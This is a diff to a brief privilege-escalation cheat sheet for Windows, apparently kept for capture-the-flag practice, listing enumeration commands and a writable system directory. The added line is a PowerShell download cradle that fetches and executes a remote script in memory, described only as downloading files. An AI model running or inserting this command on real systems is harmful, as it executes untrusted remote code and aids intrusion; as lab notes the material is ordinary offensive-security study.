@@ -5,7 +5,7 @@ Everything to check for when trying to become Administrator on windows
 # Commands
 - `powershell -c get-psdrive -psprovider filesystem` –-> To get drives
 - `dir /R` --> To look for hidden data streams (if flag is hidden)
-
+- `iex(new-object net.webclient).downloadstring('URL/FILENAME')` --> Download remote files
 
 # Directories
 - C:\Windows\System32\spool\drivers\color
